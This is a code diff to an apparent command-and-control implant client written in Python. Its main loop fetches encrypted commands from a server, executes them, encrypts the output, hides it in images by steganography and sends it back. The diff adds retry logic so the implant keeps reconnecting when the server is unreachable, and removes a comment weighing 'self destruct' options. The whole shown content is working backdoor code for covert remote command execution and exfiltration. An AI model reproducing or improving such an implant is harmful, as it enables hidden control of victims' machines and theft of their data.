@@ -132,28 +132,28 @@ def parse_json(response):
 
 if __name__ == '__main__':
     init()
+
+    num_tries = 1
     while True: 
         try: 
             #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
             #comment out encrypt and decrypt functions to test overall functionality (they won't work since IV is not shared between server and client yet.)
             response = requests.get(routes[0]) 
             encrypted_cmd = parse_json(response) 
-            cipher_text = encrypt("Testing testing 123~")
             cmd = decrypt(encrypted_cmd) 
             output = exec(cmd) 
             if output != "": 
                 msg = encrypt(output)
                 obf_img = mod_img(msg)
                 send_output(obf_img)
+            num_tries = 1
         except Exception as e: 
-            print(e)
-            break
-            """
-            Options for handling query failure: 
-                - self destruct immediately 
-                - try 3 times, the exit if all fail
-                - sleep and try again, etc.
-            """
+            if num_tries > 3: 
+                print("[-] Lost contact with server. Exiting...")
+                break
+            else:
+                print(f"[*] Could not contact server. Re-try #{num_tries}...")
+                num_tries += 1
     
 
 
